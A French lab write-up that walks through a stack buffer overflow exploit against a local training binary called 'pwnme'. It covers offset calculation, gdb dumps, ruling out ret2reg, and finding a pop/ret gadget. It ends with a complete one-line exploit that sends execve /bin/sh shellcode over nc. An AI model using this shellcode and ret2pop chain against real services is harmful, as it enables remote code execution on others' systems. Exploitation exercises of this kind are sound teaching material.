1. Pour connaitre la taille du buffer, j'ai lancé la commande `objdump -d pwnme`
   En regardant la fonction 'traite', on peut voir ces instructions:

   0x0804863c <+40>:	mov    %dl,-0x88(%ebp,%eax,1)
   0x0804866b <+87>:	movb   $0x0,-0x88(%ebp,%eax,1)
   0x08048673 <+95>:	lea    -0x88(%ebp),%eax

   Le buffer commence donc à -0x88(%ebp), et l'addresse de retour se situe à
   %ebp + 4. Le buffer fait donc en réalité 0x88 = 136 bytes, et il faut une
   chaine de caractère d'une taille de 140 pour overflow le buffer et écraser
   la valeur de retour.

2. 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEDCBA'
   est une chaine qui va faire planter le programme sur l'addresse 0x42434445.

   Pour construire et utiliser cette chaine :
   $ python -c 'print "A"*140 + "\x45\x44\x43\x42"' + "A" > | nc -C -u 127.0.0.1 7777

   Les 140 'A' servent de remplissage (on peut les remplacer par ce que l'on
   veut sauf un ' '), il y a ensuite `ECDB` qui correspondent en ASCII à
   l'addresse 0x42434445 en little-endian. Enfin, un autre 'A' de remplissage,
   car la ligne `cmd[i] = '\0';` dans le code C, et dans le binaire:
      0x0804866b <+87>:   movb   $0x0,-0x88(%ebp,%eax,1)
   remplace le dernier octet du buffer par un octet nul.

   Voici le core dump gdb:

[----------------------------------registers-----------------------------------]
EAX: 0xe
EBX: 0x41414141 ('AAAA')
ECX: 0xb7fa79b8 --> 0x0
EDX: 0x1
ESI: 0x80488a0 (<__libc_csu_init>:	push   %ebp)
EDI: 0xb7ffeb80 --> 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbfffed80 --> 0x0
EIP: 0x42434445 ('EDCB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42434445
[------------------------------------stack-------------------------------------]
0000| 0xbfffed80 --> 0x0
0004| 0xbfffed84 --> 0xbfffedac ('A' <repeats 140 times>, "EDCB")
0008| 0xbfffed88 --> 0xbffff1ac --> 0x7d990002
0012| 0xbfffed8c --> 0x3
0016| 0xbfffed90 --> 0xbffff1ac --> 0x7d990002
0020| 0xbfffed94 --> 0xbfffeda8 --> 0x10
0024| 0xbfffed98 --> 0xbfffee0c ('A' <repeats 44 times>, "EDCB")
0028| 0xbfffed9c --> 0xb7fd4ece (<_dl_lookup_symbol_x+302>:	add    $0x30,%esp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV

3. Pour tester la possibilité d'un ret2reg, j'ai analysé les registres au moment
   du retour de la fonction, en mettant un breakpoint sur l'instruction ret
   (0x08048742).

   $ gdb ./pwnme
   (gdb) b *0x08048742
   (gdb) r

   En ayant envoyé le payload précédent, j'ai obtenu le dump suivant:

   EAX: 0xe
   EBX: 0x41414141 ('AAAA')
   ECX: 0xb7fa79b8 --> 0x0
   EDX: 0x1
   ESI: 0x80488a0 (<__libc_csu_init>:	push   %ebp)
   EDI: 0xb7ffeb80 --> 0x0
   EBP: 0x41414141 ('AAAA')
   ESP: 0xbfffed7c ("EDCB")
   EIP: 0x8048742 (<traite+302>:	ret)

   Aucun registre ne contient d'addresse pointant vers le buffer à part esp,
   mais il n'existe pas d'instructions qui ferait un jmp ou call %esp:

   $ objdump -d pwnme | grep 'call.*esp'
   $ objdump -d pwnme | grep 'jmp.*esp'
   $ xxd -g0 -c256 ./pwnme | grep -i "ffe4"
   $ xxd -g0 -c256 ./pwnme | grep -i "ffd4"

   Je pense qu'il n'est donc pas possible de faire un ret2reg ici.

4. Pour tester la possibilité d'un ret2pop, j'ai d'abord commencé de la même
   manière que pour le ret2reg, en utilisant gdb pour placer un endpoint sur le
   ret de la fonction 'traite' (à l'adresse 0x08048742).

   $ gdb ./pwnme
   (gdb) b *0x08048742
   (gdb) r

   Après avoir envoyé le payload précédent, j'ai regardé le haut de la pile :

   gdb-peda$ x/10x $esp
   0xbfffed7c:	0x45	0x44	0x43	0x42	0x00	0x00	0x00	0x00
   0xbfffed84:	0xac	0xed

   Qui contient bien l'adresse 0x42434445, ce qui indique qu'il est possible de
   remplacer cette adresse par une autre contenant les instructions ret pop.

   Le buffer est passé en paramètre de la fonction (sans en être le premier). Il
   ne faudrait qu'un seul pop pour pouvoir faire que ret exécute notre shellcode
   (placé au début du buffer). La fonction 'traite' contient elle même la suite
   d'instruction pop ret :

   $ objdump -d pwnme | grep -A 1 pop | grep -B 3 ret
   ...
   8048740:	5b                   	pop    %ebx
   8048741:	5d                   	pop    %ebp
   8048742:	c3                   	ret
   ...

   Je pense donc qu'il est possible d'utiliser un ret2pop.

5. Je vais donc utiliser la méthode du ret2pop, en remplacant l'adresse de
   retour par 0x08048741 (cf. juste au dessus), pour faire un pop permettant de
   mettre le début du buffer contenant notre shellcode sur la stack.

   La technique ret2pop utilise un gadget à adresse fixe contenu dans la section
   .text du binaire, qui reste donc à position fixe même avec l'ASLR activé.

6. python3 -c 'import sys; from struct import pack; shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\x50\x66\xb8\x2d\x69\x50\x89\xe6\x31\xc0\x50\x56\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"; sys.stdout.buffer.write(shellcode + b"A" * (140 - len(shellcode)) + pack("<L", 0x8048741) + b"A")' | nc -C -u 127.0.0.1 7777

   J'ai repris l'appel à execve de l'exercice 1 pour en faire un shellcode
   simple, remplis le buffer de padding puis mis l'adresse du gadget.
